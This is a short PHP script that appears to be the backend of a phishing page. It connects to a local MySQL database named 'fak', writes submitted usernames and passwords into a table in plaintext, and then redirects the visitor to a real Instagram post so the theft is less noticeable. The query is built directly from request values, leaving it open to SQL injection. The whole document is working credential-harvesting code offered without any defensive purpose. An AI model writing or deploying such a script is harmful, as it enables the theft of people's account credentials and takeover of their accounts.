<html>
<?php
$_SERVER="localhost";
$_USER="root";
$_PASSWORD="";
$_DB="fak";

$con=mysqli_connect($_SERVER, $_USER, $_PASSWORD, $_DB);
if(!$con)
echo "Not Connect";
$uname=$_REQUEST['username'];
$upass=$_REQUEST['password'];
$table="INSERT INTO user(id,pass) values('$uname','$upass')";
mysqli_query($con,$table);
header("location:https://www.instagram.com/p/CxauOy7p7rY/?utm_source=ig_web_copy_link")

?>

</html>